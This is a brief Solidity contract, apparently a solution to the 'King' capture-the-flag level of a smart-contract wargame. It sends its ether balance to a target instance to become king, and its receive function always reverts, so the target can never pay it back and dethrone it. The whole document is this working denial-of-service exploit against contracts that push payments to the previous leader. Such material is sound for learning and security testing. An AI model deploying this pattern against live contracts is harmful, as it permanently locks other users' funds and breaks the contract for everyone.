// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract King {
    address instanceAddress;

    constructor(address _instanceAddress) payable {
        instanceAddress = _instanceAddress;
    }

    function claimKingship() external {
        (bool success,) = payable(instanceAddress).call{value: address(this).balance}("");
        require(success, "Failed to claim kingship");
    }

    receive() external payable {
        revert();
    }
}
